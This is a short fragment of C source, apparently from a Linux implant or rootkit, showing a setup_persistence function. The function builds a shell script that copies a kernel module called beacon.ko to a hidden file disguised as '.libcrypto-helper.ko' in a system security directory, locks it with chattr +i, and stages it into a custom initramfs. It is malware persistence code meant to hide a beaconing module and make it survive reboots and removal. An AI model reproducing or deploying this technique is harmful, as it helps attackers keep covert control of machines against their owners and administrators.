...
static void setup_persistence(void) {
    ...
    char *script_content =
        ...
        "cp /tmp/beacon.ko /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
        "chattr +i /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
        "mkdir -p /tmp/custom_initramfs\n"
        "cp /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko /tmp/custom_initramfs/beacon.ko\n"
